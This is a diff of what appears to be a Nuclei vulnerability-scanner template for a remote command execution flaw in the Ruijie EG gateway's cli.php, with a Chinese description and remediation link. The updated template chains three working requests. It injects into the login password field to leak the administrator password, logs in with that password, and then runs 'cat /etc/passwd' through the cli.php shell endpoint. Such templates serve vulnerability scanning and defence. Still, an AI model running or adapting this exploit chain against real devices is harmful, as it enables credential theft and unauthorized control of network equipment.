@@ -1,31 +1,56 @@
 id: ruijie-eg-rce
-
 info:
   name: Ruijie EG cli.php RCE
-  author: pikpikcu
+  author:
+  - l0ne1y
+  tags:
+  - ruijie
+  - rce
+  description: "锐捷 EG易网关 cli.php 远程命令执行漏洞 \n锐捷EG易网关 cli.php存在命令执行漏洞，配合 锐捷EG易网关 管理员账号密码泄露漏洞
+    达到RCE控制服务器。"
+  reference:
+  - https://github.com/peiqi0/peiqi-wiki-poc/blob/peiqi/peiqi_wiki/%e7%bd%91%e7%bb%9c%e8%ae%be%e5%a4%87%e6%bc%8f%e6%b4%9e/%e9%94%90%e6%8d%b7/%e9%94%90%e6%8d%b7eg%e6%98%93%e7%bd%91%e5%85%b3%20cli.php%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e.md
+  - https://www.ruijienetworks.com
   severity: critical
-  reference: http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3%20cli.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
-  tags: ruijie,rce
-
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+    https://www.ruijienetworks.com
 requests:
-  - raw:
-      - |
-        POST /cli.php?a=shell HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
-        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
-        Content-Length: 111
+- matchers:
+  - type: regex
+    part: body
+    regex:
+    - 'root:.*:0:0:'
+    - nobody:.*:0:0
+  - type: status
+    status:
+    - 200
+  extractors:
+  - name: admin
+    type: regex
+    regex:
+    - admin ([a-zA-Z0-9#@]+)",
+    group: 1
+    internal: true
+  matchers-condition: and
+  raw:
+  - |
+    POST /login.php HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
 
-        notdelay=true&command=cat /etc/passwd
+    username=admin&password=admin?show+webmaster+user
+  - |
+    POST /login.php HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
 
-    matchers-condition: and
-    matchers:
-      - type: regex
-        regex:
-          - "root:.*:0:0"
-          - "nobody:x:0:0:"
-        part: body
+    username=admin&password={{admin}}
+  - |
+    POST /cli.php?a=shell HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded;charset=UTF-8
 
-      - type: status
-        status:
-          - 200
+    notdelay=true&command=cat /etc/passwd
+  cookie-reuse: true
